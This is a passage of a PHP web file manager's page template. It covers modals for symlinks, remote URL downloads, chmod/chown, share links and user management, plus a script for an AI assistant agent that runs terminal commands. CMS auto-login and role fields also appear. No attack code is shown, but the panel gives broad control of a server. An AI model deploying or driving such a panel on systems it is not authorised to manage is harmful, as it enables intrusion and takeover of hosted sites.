            <input type="radio" name="br_mode" value="replace" checked> <span style="font-size:13px">Find &amp; Replace</span>
          </label>
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
            <input type="text" name="br_find" class="inp" placeholder="Find…">
            <input type="text" name="br_replace" class="inp" placeholder="Replace with…">
          </div>
          <label style="display:flex;align-items:center;gap:8px;cursor:pointer">
            <input type="radio" name="br_mode" value="prefix"> <span style="font-size:13px">Add Prefix</span>
          </label>
          <label style="display:flex;align-items:center;gap:8px;cursor:pointer">
            <input type="radio" name="br_mode" value="suffix"> <span style="font-size:13px">Add Suffix (before extension)</span>
          </label>
          <button type="submit" class="btn btn-p" style="margin-top:4px"><svg viewBox="0 0 24 24"><path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"/></svg>Rename selected files</button>
        </div>
      </form>
    </div>
  </div>
</div>

<!-- SYMLINK MODAL -->
<div class="mod-ov" id="symlinkOv">
  <div class="mod mod-sm">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg></div><span class="mod-title">Create Symlink</span><button class="btn btn-icon btn-g" id="symlinkClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body">
      <form method="post" style="display:flex;flex-direction:column;gap:10px">
        <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
        <input type="hidden" name="action" value="create_symlink">
        <div><label style="display:block;font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.7px;margin-bottom:6px">Target path (can be relative or absolute)</label><input type="text" name="sym_target" class="inp" style="width:100%" placeholder="/path/to/target" required></div>
        <div><label style="display:block;font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.7px;margin-bottom:6px">Link name (in current folder)</label><input type="text" name="sym_name" class="inp" style="width:100%" placeholder="link-name" required></div>
        <button type="submit" class="btn btn-p"><svg viewBox="0 0 24 24"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/></svg>Create Symlink</button>
      </form>
    </div>
  </div>
</div>

<!-- REMOTE DOWNLOAD MODAL -->
<div class="mod-ov" id="remoteDlOv">
  <div class="mod mod-sm">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg></div><span class="mod-title">Download from URL</span><button class="btn btn-icon btn-g" id="remoteDlClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body">
      <label style="display:block;font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.6px;margin-bottom:8px">URL</label>
      <input type="text" id="rdUrl" class="inp" placeholder="https://example.com/file.zip" style="width:100%;margin-bottom:12px">
      <label style="display:block;font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.6px;margin-bottom:8px">Save as (optional)</label>
      <input type="text" id="rdName" class="inp" placeholder="Leave blank to auto-detect" style="width:100%;margin-bottom:14px">
      <div style="font-size:11.5px;color:var(--t3);margin-bottom:14px">Downloads directly to <span class="mono" id="rdCwd"></span>. Max 200 MB, http/https only.</div>
      <button type="button" id="rdApply" class="btn btn-p" style="width:100%">Download</button>
    </div>
  </div>
</div>

<!-- TAG MODAL -->
<div class="mod-ov" id="tagOv">
  <div class="mod mod-sm">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10c.926 0 1.648-.746 1.648-1.688 0-.437-.18-.835-.437-1.125-.29-.289-.438-.652-.438-1.125a1.64 1.64 0 0 1 1.668-1.668h1.996c3.051 0 5.555-2.503 5.555-5.554C21.965 6.012 17.461 2 12 2z"/></svg></div><span class="mod-title" id="tagTitle">Tag</span><button class="btn btn-icon btn-g" id="tagClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body">
      <input type="hidden" id="tagItemName">
      <label style="display:block;font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.6px;margin-bottom:8px">Color</label>
      <div id="tagSwatches" style="margin-bottom:14px"></div>
      <label style="display:block;font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.6px;margin-bottom:8px">Label (optional)</label>
      <input type="text" id="tagLabel" class="inp" placeholder="e.g. Important" maxlength="24" style="width:100%;margin-bottom:14px">
      <div style="display:flex;gap:8px">
        <button type="button" id="tagApply" class="btn btn-p" style="flex:1">Apply Tag</button>
        <button type="button" id="tagRemove" class="btn btn-g" style="flex:1">Remove Tag</button>
      </div>
    </div>
  </div>
</div>

<!-- BULK CHMOD MODAL -->
<div class="mod-ov" id="bulkChmodOv">
  <div class="mod mod-sm">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></div><span class="mod-title" id="bcTitle">Change Permissions</span><button class="btn btn-icon btn-g" id="bcClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body">
      <label style="display:block;font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.6px;margin-bottom:8px">Permission (octal)</label>
      <input type="text" id="bcPerm" class="inp" value="755" placeholder="e.g. 755" style="width:100%;margin-bottom:12px;font-family:'JetBrains Mono',monospace">
      <div style="font-size:11.5px;color:var(--t3);margin-bottom:14px">Applies to all selected items (not recursive into subfolders).</div>
      <button type="button" id="bcApply" class="btn btn-p" style="width:100%">Apply</button>
    </div>
  </div>
</div>

<!-- PERMISSIONS MODAL -->
<div class="mod-ov" id="permOv">
  <div class="mod mod-sm">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></div><span class="mod-title" id="permTitle">Permissions</span><button class="btn btn-icon btn-g" id="permClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body">
      <form method="post" id="permForm">
        <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
        <input type="hidden" name="action" value="chmod_item">
        <input type="hidden" name="item_name" id="permName">
        <table class="perm-t" style="width:100%;margin-bottom:12px">
          <thead><tr><th></th><th>Read</th><th>Write</th><th>Execute</th></tr></thead>
          <tbody>
            <tr><td>Owner</td><td><input type="checkbox" class="rck perm-ck" data-bit="256"></td><td><input type="checkbox" class="rck perm-ck" data-bit="128"></td><td><input type="checkbox" class="rck perm-ck" data-bit="64"></td></tr>
            <tr><td>Group</td><td><input type="checkbox" class="rck perm-ck" data-bit="32"></td><td><input type="checkbox" class="rck perm-ck" data-bit="16"></td><td><input type="checkbox" class="rck perm-ck" data-bit="8"></td></tr>
            <tr><td>Others</td><td><input type="checkbox" class="rck perm-ck" data-bit="4"></td><td><input type="checkbox" class="rck perm-ck" data-bit="2"></td><td><input type="checkbox" class="rck perm-ck" data-bit="1"></td></tr>
          </tbody>
        </table>
        <div style="display:flex;align-items:center;gap:10px">
          <label style="font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.7px">Octal</label>
          <input type="text" id="permOctal" name="perm" class="inp mono" style="width:80px;text-align:center" maxlength="4" pattern="[0-7]{3,4}" required>
          <button type="submit" class="btn btn-p" style="margin-left:auto"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>Apply</button>
        </div>
      </form>
    </div>
  </div>
</div>

<!-- CREATE SHARE LINK MODAL -->
<div class="mod-ov" id="shareCreateOv">
  <div class="mod mod-sm">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"/><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"/></svg></div><span class="mod-title" id="shareCreateTitle">Share Link</span><button class="btn btn-icon btn-g" id="shareCreateClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body">
      <form method="post" style="display:flex;flex-direction:column;gap:12px">
        <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
        <input type="hidden" name="action" value="create_share">
        <input type="hidden" name="item_name" id="shareItemName">
        <div>
          <label style="display:block;font-size:11px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.7px;margin-bottom:8px">Link expires after</label>
          <select name="share_dur" class="inp" style="width:100%">
            <option value="1h">1 hour</option>
            <option value="1d" selected>1 day</option>
            <option value="7d">7 days</option>
            <option value="30d">30 days</option>
            <option value="never">Never</option>
          </select>
        </div>
        <button type="submit" class="btn btn-p"><svg viewBox="0 0 24 24"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/></svg>Create Link</button>
      </form>
    </div>
  </div>
</div>

<!-- MANAGE SHARE LINKS MODAL -->
<div class="mod-ov" id="sharesOv">
  <div class="mod mod-lg">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/></svg></div><span class="mod-title">Share Links</span><button class="btn btn-icon btn-g" id="sharesClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body" style="padding:0">
      <?php $allShares=$fm->getShares();if(!$allShares):?>
      <div class="empty" style="padding:40px"><svg viewBox="0 0 24 24"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/></svg><p>No share links yet. Right-click a file and choose "Share Link".</p></div>
      <?php else: foreach($allShares as $sh):
        $expired=!empty($sh['expires'])&&$sh['expires']<time();
        $shareUrl=(isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']?'https://':'http://').$_SERVER['HTTP_HOST'].strtok($_SERVER['REQUEST_URI'],'?').'?share='.$sh['token'];
      ?>
      <div style="padding:12px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:12px;flex-wrap:wrap;<?=$expired?'opacity:.5':''?>">
        <div style="flex:1;min-width:180px">
          <div style="font-size:13px;font-weight:600;color:var(--t1)"><?=htmlspecialchars($sh['name'])?></div>
          <div style="font-size:11px;color:var(--t3);font-family:'JetBrains Mono',monospace;margin-top:2px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:340px"><?=htmlspecialchars($shareUrl)?></div>
          <div style="font-size:11px;color:var(--t3);margin-top:2px"><?=$expired?'Expired':(empty($sh['expires'])?'Never expires':('Expires '.date('d/m/Y H:i',$sh['expires'])))?> · by <?=htmlspecialchars($sh['by'])?></div>
        </div>
        <?php if(!$expired):?><button type="button" class="btn btn-xs btn-g share-copy-btn" data-url="<?=he($shareUrl)?>"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>Copy</button><?php endif;?>
        <form method="post" onsubmit="return confirm('Revoke this share link?')"><input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>"><input type="hidden" name="action" value="revoke_share"><input type="hidden" name="share_id" value="<?=htmlspecialchars($sh['id'])?>"><button class="btn btn-xs btn-red"><svg viewBox="0 0 24 24"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/></svg>Revoke</button></form>
      </div>
      <?php endforeach;endif;?>
    </div>
  </div>
</div>
<?php endif;?>

<!-- OWNER / GROUP MODAL -->
<?php if(!empty($_SESSION['fm_admin'])):?>
<div class="mod-ov" id="ownerOv">
  <div class="mod mod-sm">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><circle cx="9" cy="7" r="4"/><path d="M2 21v-1a7 7 0 0 1 14 0v1"/><path d="M17 11h5M19 9v4"/></svg></div><span class="mod-title">Owner &amp; Group</span><button class="btn btn-icon btn-g" id="ownerClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <form method="post" class="mod-body" style="display:flex;flex-direction:column;gap:10px">
      <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>">
      <input type="hidden" name="action" value="chown_item"><input type="hidden" name="item_name" id="ownerItem">
      <div style="font-size:12px;color:var(--t2)">Item: <strong id="ownerItemLabel"></strong></div>
      <input type="text" name="owner" id="ownerName" class="inp" placeholder="Owner name or UID">
      <input type="text" name="group" id="groupName" class="inp" placeholder="Group name or GID">
      <label style="display:flex;align-items:center;gap:8px;font-size:12px;color:var(--t2);text-transform:none;letter-spacing:0"><input type="checkbox" name="recursive" value="1"> Apply recursively to contents</label>
      <button type="submit" class="btn btn-p">Apply ownership</button>
      <div style="font-size:10.5px;color:var(--t3)">The server account must have permission to change ownership.</div>
    </form>
  </div>
</div>
<?php endif;?>

<!-- USERS MODAL -->
<?php if(!empty($_SESSION['fm_admin'])):?>
<div class="mod-ov" id="usersOv">
  <div class="mod mod-sm">
    <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><circle cx="9" cy="7" r="4"/><path d="M2 21v-2a4 4 0 0 1 4-4h6a4 4 0 0 1 4 4v2"/></svg></div><span class="mod-title">Manage Users</span><button class="btn btn-icon btn-g" id="usersClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
    <div class="mod-body">
      <?php foreach(fm_load_users($usersFile) as $u):?>
      <div style="display:flex;align-items:center;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--border)">
        <div style="font-size:13px;color:#e4e4e7"><strong><?=htmlspecialchars($u['user'])?></strong><?php if(!empty($u['admin'])):?><span style="color:#85898C;font-size:11px"> · admin</span><?php endif;?><?php if(!empty($u['readonly'])):?><span style="color:#f59e0b;font-size:11px"> · ro</span><?php endif;?><div style="color:#71717a;font-size:11px;margin-top:1px"><?=htmlspecialchars($u['root']?:'Full access')?> · quota: <?=htmlspecialchars(fm_fmt_quota(fm_user_quota_bytes($u)))?></div></div>
        <?php if($u['user']!=='admin'&&$u['user']!==$_SESSION['fm_user']):?>
        <form method="post" onsubmit="return confirm('Remove?')"><input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>"><input type="hidden" name="action" value="remove_user"><input type="hidden" name="target_user" value="<?=htmlspecialchars($u['user'])?>"><button class="btn btn-icon btn-g" style="color:#fca5a5"><svg viewBox="0 0 24 24"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg></button></form>
        <?php endif;?>
      </div>
      <?php endforeach;?>
      <div style="font-size:10px;font-weight:700;color:var(--t3);text-transform:uppercase;letter-spacing:.7px;margin:14px 0 8px">Add User</div>
      <form method="post" style="display:flex;flex-direction:column;gap:8px">
        <input type="hidden" name="csrf_token" value="<?=htmlspecialchars($_SESSION['csrf_token'])?>"><input type="hidden" name="action" value="add_user">
        <input type="text" name="new_user" placeholder="Username" required class="inp" style="width:100%">
        <input type="password" name="new_pass" placeholder="Password" required class="inp" style="width:100%">
        <input type="text" name="new_root" placeholder="Restrict folder (empty = full)" class="inp" style="width:100%">
        <input type="number" name="new_quota" min="0" step="1" placeholder="Quota in MB (0 = unlimited)" class="inp" style="width:100%">
        <label style="display:flex;align-items:center;gap:7px;font-size:12.5px;color:var(--t2)"><input type="checkbox" name="new_readonly" value="1">Read-only</label>
        <button type="submit" class="btn btn-p" style="align-self:flex-start">Create user</button>
      </form>
    </div>
  </div>
</div>
<?php endif;?>

<?php function he($s){return htmlspecialchars($s,ENT_QUOTES|ENT_HTML5);}?>

<script>
const CWD  = <?=json_encode($fm->getCwd())?>;
const FM_MAIN_PATH = <?=json_encode(realpath(__DIR__)?:__DIR__)?>;
const CSRF = <?=json_encode($_SESSION['csrf_token'])?>;
const FM_CMS_AUTO_LOGIN = <?=!empty($_SESSION['fm_wp_auto_login_pending'])?'true':'false'?>;
const FM_FORCE_CREDENTIAL_CHANGE = <?=!empty($_SESSION['fm_force_credential_change'])?'true':'false'?>;
const RO   = <?=$fm->isRO()?'true':'false'?>;
let termCwd = CWD;

/* ═══════════════════════════════════════
   SIDEBAR TOGGLE
═══════════════════════════════════════ */
const menuBtn=document.getElementById('menuBtn');
const sidebar=document.getElementById('sidebar');
const sideOv =document.getElementById('sideOv');
function openSB(){sidebar.classList.add('open');sideOv.style.display='block';requestAnimationFrame(()=>sideOv.classList.add('vis'));document.body.style.overflow='hidden';}
function closeSB(){sidebar.classList.remove('open');sideOv.classList.remove('vis');setTimeout(()=>{sideOv.style.display='none';},280);document.body.style.overflow='';}
menuBtn?.addEventListener('click',()=>sidebar.classList.contains('open')?closeSB():openSB());
sideOv.addEventListener('click',closeSB);
sidebar.querySelectorAll('.sb-item,.sb-flink').forEach(el=>el.addEventListener('click',()=>{if(window.innerWidth<=768)closeSB();}));

/* ═══════════════════════════════════════
   ASSISTANT AGENT
 ═══════════════════════════════════════ */
const agentPanel=document.getElementById('agentPanel');
const agentMessages=document.getElementById('agentMessages');
const agentInput=document.getElementById('agentInput');
const agentSend=document.getElementById('agentSend');
const agentSettings=document.getElementById('agentSettings');
const agentConfigForm=document.getElementById('agentConfigForm');
const agentKeyInput=document.getElementById('agentKeyInput');
const agentKeyState=document.getElementById('agentKeyState');
const agentCwd=document.getElementById('agentCwd');
let agentBusy=false,agentHistoryLoaded=false;
 let agentScrollFrame=0,agentRevealingAction=null;
 function agentScroll(){
   if(!agentMessages)return;
   cancelAnimationFrame(agentScrollFrame);
   agentScrollFrame=requestAnimationFrame(()=>{
     agentMessages.scrollTop=agentMessages.scrollHeight;
     requestAnimationFrame(()=>{if(agentMessages)agentMessages.scrollTop=agentMessages.scrollHeight;});
   });
 }
function agentIcon(){
  return '<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M7.5 4.5c-2.4 0-4 1.6-4 4v4.5c0 2.4 1.6 4 4 4h1.2l2.3 2.1 2.3-2.1h1.2c2.4 0 4-1.6 4-4V8.5c0-2.4-1.6-4-4-4h-7z"/><path d="M8 11.5h.01M16 11.5h.01"/><path d="M8.5 14.5c1.8 1.2 5.2 1.2 7 0"/></svg>';
}
 function agentStopActionReveal(){
   if(agentRevealingAction)agentRevealingAction.classList.remove('is-revealing');
   agentRevealingAction=null;
 }
function agentRemoveWelcome(){document.getElementById('agentWelcome')?.remove();}
function agentAddUser(text){
  agentRemoveWelcome();
  const row=document.createElement('div');row.className='agent-msg user';
  row.innerHTML='<div class="agent-bubble"></div>';row.querySelector('.agent-bubble').textContent=text;
  agentMessages.appendChild(row);agentScroll();
}
function agentTypeText(el,text,speed=12){
  return new Promise(resolve=>{
    let i=0;el.textContent='';
    const tick=()=>{if(i>=text.length){resolve();return;}el.textContent+=text[i++];agentScroll();setTimeout(tick,speed);};
    tick();
  });
}
function agentAddAction(action,animate=true){
  const details=document.createElement('details');details.className='agent-action'+(action.ok?'':' failed');
  details.innerHTML='<summary><span class="action-pip"></span><span></span></summary><div class="action-detail"><div class="action-command"></div><div class="action-output"></div></div>';
   details.open=false;
   if(animate){
     details.classList.add('is-revealing');
     agentRevealingAction=details;
     setTimeout(()=>{if(agentRevealingAction===details)agentStopActionReveal();},1600);
   }
  details.querySelector('summary span:nth-child(2)').textContent=action.label||'Running action';
  details.querySelector('.action-command').textContent=action.command||'';
  details.querySelector('.action-output').textContent=action.output||'No output.';
  agentMessages.appendChild(details);agentScroll();
  return animate?new Promise(r=>setTimeout(r,420)):Promise.resolve();
}
async function agentRenderAssistant(item,animate=true){
  agentRemoveWelcome();
  const segments=Array.isArray(item.segments)?item.segments:[{type:'message',text:item.content||''}];
  for(const seg of segments){
    if(seg.type==='action'){await agentAddAction(seg,animate);continue;}
    if(!seg.text)continue;
     agentStopActionReveal();
    const row=document.createElement('div');row.className='agent-msg assistant';
    row.innerHTML='<div class="agent-avatar">'+agentIcon()+'</div><div class="agent-bubble"></div>';
    agentMessages.appendChild(row);
    if(animate)await agentTypeText(row.querySelector('.agent-bubble'),seg.text);
    else row.querySelector('.agent-bubble').textContent=seg.text;
    agentScroll();
  }
}
function agentAddError(text){
  agentRemoveWelcome();
  const box=document.createElement('div');box.className='agent-error';
  box.innerHTML='<span></span><button type="button" class="btn btn-xs btn-red">Clear chat</button>';
  box.querySelector('span').textContent=text;box.querySelector('button').addEventListener('click',agentClear);
  agentMessages.appendChild(box);agentScroll();
}
async function agentLoadHistory(){
  if(agentHistoryLoaded)return;
  agentHistoryLoaded=true;
  try{
    const r=await fetch('?x=agent_history',{cache:'no-store'});const d=await r.json();
    if(!d.ok||!Array.isArray(d.messages))return;
    const items=d.messages;
    if(items.length){agentRemoveWelcome();for(const item of items){if(item.role==='user')agentAddUser(item.content||'');else if(item.role==='assistant'){if(item.error)agentAddError(item.content||'AI request failed.');else await agentRenderAssistant(item,false);}}}
  }catch(e){agentHistoryLoaded=false;}
}
function agentOpen(){
  document.querySelector('.shell')?.classList.add('agent-open');agentPanel?.classList.add('open');agentLoadConfig();
  agentCwd.textContent=CWD;agentLoadHistory().then(agentScroll);setTimeout(()=>agentInput?.focus(),220);
}
function agentClosePanel(){agentPanel?.classList.remove('open');document.querySelector('.shell')?.classList.remove('agent-open');}
document.getElementById('agentBtn')?.addEventListener('click',agentOpen);
document.getElementById('agentClose')?.addEventListener('click',agentClosePanel);
document.getElementById('agentSettingsBtn')?.addEventListener('click',()=>{
  if(!agentSettings)return;
  agentSettings.hidden=!agentSettings.hidden;
  if(!agentSettings.hidden){agentLoadConfig();setTimeout(()=>agentKeyInput?.focus(),80);}
});
async function agentLoadConfig(){
  try{
    const r=await fetch('?x=agent_config',{cache:'no-store'});const d=await r.json();
    if(d.configured){agentKeyState.textContent='Connected · '+d.masked;agentKeyState.classList.remove('empty');}
    else{agentKeyState.textContent='Not configured';agentKeyState.classList.add('empty');}
  }catch(e){}
}
agentConfigForm?.addEventListener('submit',async e=>{
  e.preventDefault();const key=agentKeyInput.value.trim();
  if(!key){agentKeyState.textContent='Enter a key to connect Gemini.';agentKeyState.classList.add('empty');return;}
  const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('gemini_api_key',key);
  const save=agentConfigForm.querySelector('button');save.disabled=true;save.textContent='Saving…';
   try{const r=await fetch('?x=agent_config_save',{method:'POST',body:fd});const d=await r.json();if(!r.ok||!d.ok)throw new Error(d.error||'Save failed');agentKeyInput.value='';agentKeyState.textContent='Connected · key saved securely';agentKeyState.classList.remove('empty');}
  catch(err){agentKeyState.textContent=err.message||'Could not save the key.';agentKeyState.classList.add('empty');}
  save.disabled=false;save.textContent='Save';
});
document.getElementById('agentResize')?.addEventListener('pointerdown',e=>{
  if(window.innerWidth<=768)return;
  e.preventDefault();agentPanel.classList.add('resizing');agentResizeStart(e);
});
function agentResizeStart(e){
  const startX=e.clientX,startW=agentPanel.getBoundingClientRect().width;
  const move=ev=>{const width=Math.max(320,Math.min(Math.min(720,window.innerWidth-270),startW+(startX-ev.clientX)));document.querySelector('.shell').style.setProperty('--agent-w',width+'px');};
  const done=()=>{agentPanel.classList.remove('resizing');document.removeEventListener('pointermove',move);document.removeEventListener('pointerup',done);};
  document.addEventListener('pointermove',move);document.addEventListener('pointerup',done,{once:true});
}
async function agentClear(){
  if(!confirm('Clear the Assistant Agent conversation?'))return;
  const fd=new FormData();fd.append('csrf_token',CSRF);
   try{const r=await fetch('?x=agent_clear',{method:'POST',body:fd});const d=await r.json();if(!d.ok)throw new Error();agentMessages.innerHTML='<div class="agent-welcome" id="agentWelcome"><div class="agent-welcome-icon">'+agentIcon()+'</div><strong>How can I help?</strong><p>Ask me to inspect, organize, or manage this workspace. I’ll show every terminal command and file action as it happens.</p></div>';agentHistoryLoaded=true;}
  catch(e){agentAddError('Could not clear the conversation. Please try again.');}
}
async function agentSubmit(){
  if(agentBusy)return;
  const text=agentInput.value.trim();if(!text)return;
  agentInput.value='';agentInput.style.height='auto';agentAddUser(text);
  const typing=document.createElement('div');typing.className='agent-typing';typing.innerHTML='<i></i><i></i><i></i><span>Thinking</span>';agentMessages.appendChild(typing);agentScroll();
   agentBusy=true;agentSend.disabled=true;
  const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('message',text);
  try{
    const r=await fetch('?x=agent_chat&dir='+encodeURIComponent(CWD),{method:'POST',body:fd,cache:'no-store'});const d=await r.json();
    typing.remove();
    if(!r.ok||!d.ok){agentAddError(d.error||'The AI request failed. Clear the conversation and start again.');if(d.needs_config){agentSettings.hidden=false;agentLoadConfig();}}
    else{await agentRenderAssistant({content:d.reply,segments:d.segments},true);agentCwd.textContent=d.cwd||CWD;}
  }catch(e){typing.remove();agentAddError('The AI could not be reached. Clear the conversation and start again if its context cache is full.');}
   agentBusy=false;agentSend.disabled=false;
}
agentSend?.addEventListener('click',agentSubmit);
agentInput?.addEventListener('keydown',e=>{if(e.key==='Enter'&&!e.shiftKey){e.preventDefault();agentSubmit();}});
agentInput?.addEventListener('input',()=>{agentInput.style.height='auto';agentInput.style.height=Math.min(agentInput.scrollHeight,120)+'px';});

/* ═══════════════════════════════════════
   MODAL HELPERS
═══════════════════════════════════════ */
function openMod(id){document.getElementById(id)?.classList.add('open');}
function closeMod(id){document.getElementById(id)?.classList.remove('open');}
document.addEventListener('keydown',e=>{
  if(e.key!=='Escape')return;
  ['prevOv','termOv','hashOv','actOv','srvOv','brOv','symlinkOv','usersOv','ownerOv','permOv','shareCreateOv','sharesOv','largeOv','dupOv','errLogOv','envOv','speedOv','wpNumbersOv'].forEach(closeMod);
  closeSheet();closeCtx();
});
['prevOv','termOv','hashOv','actOv','srvOv','brOv','symlinkOv','usersOv','ownerOv','permOv','shareCreateOv','sharesOv','largeOv','dupOv','errLogOv','envOv','speedOv','wpNumbersOv'].forEach(id=>{
  document.getElementById(id)?.addEventListener('click',e=>{if(e.target===document.getElementById(id))closeMod(id);});
});

/* ═══════════════════════════════════════
   VIEW TOGGLE
═══════════════════════════════════════ */
let isGrid=localStorage.getItem('fm_view')==='grid';
const lv=document.getElementById('lvw'),gv=document.getElementById('gvw');
const vbl=document.getElementById('vIcoList'),vbg=document.getElementById('vIcoGrid');
function applyView(){if(isGrid){lv&&(lv.style.display='none');gv&&(gv.style.display='block');if(vbl)vbl.style.display='block';if(vbg)vbg.style.display='none';}else{lv&&(lv.style.display='block');gv&&(gv.style.display='none');if(vbl)vbl.style.display='none';if(vbg)vbg.style.display='block';}}
applyView();
document.getElementById('viewBtn')?.addEventListener('click',()=>{isGrid=!isGrid;localStorage.setItem('fm_view',isGrid?'grid':'list');applyView();});

/* ── Theme toggle (shared across all users/devices, saved server-side) ── */
(function(){
  const sunIco=document.getElementById('themeIcoSun'),moonIco=document.getElementById('themeIcoMoon');
  function applyThemeIcon(t){
    if(!sunIco||!moonIco)return;
    if(t==='light'){sunIco.style.display='';moonIco.style.display='none';}
    else{sunIco.style.display='none';moonIco.style.display='';}
  }
  applyThemeIcon(document.documentElement.getAttribute('data-theme')||'dark');
  document.getElementById('themeBtn')?.addEventListener('click',async()=>{
    const cur=document.documentElement.getAttribute('data-theme')||'dark';
    const next=cur==='light'?'dark':'light';
    document.documentElement.setAttribute('data-theme',next);
    applyThemeIcon(next);
    try{
      const fd=new FormData();fd.append('theme',next);
      await fetch('?x=set_theme',{method:'POST',body:fd});
    }catch(e){}
  });
})();

/* ═══════════════════════════════════════
   FORM SUBMIT HELPER
═══════════════════════════════════════ */
function af(action,fields){
  document.getElementById('af_a').value=action;
  const map={item_name:'af_n',old_name:'af_o',new_name:'af_nw',items:'af_items',target:'af_tgt',trash_id:'af_tr',perm:'af_perm',color:'af_color',label:'af_label',config_path:'af_cfg',cms_id:'af_cid',cms_role:'af_crole',url:'af_url',fname:'af_fname'};
  Object.entries(map).forEach(([k,id])=>{document.getElementById(id).value='';});
  Object.entries(fields).forEach(([k,v])=>{const id=map[k];if(id)document.getElementById(id).value=v;});
  document.getElementById('af').submit();
}

/* ═══════════════════════════════════════
   FILE ACTIONS
═══════════════════════════════════════ */
function doAction(action,name,extra={}){
  if(action==='del'){
    if(!confirm(`Move "${name}" to trash?`))return;
    af('delete',{item_name:name});
  }else if(action==='ren'){
    const nw=prompt(`Rename "${name}" to:`,name);
    if(nw&&nw.trim()&&nw.trim()!==name)af('rename',{old_name:name,new_name:nw.trim()});
  }else if(action==='unzip'){
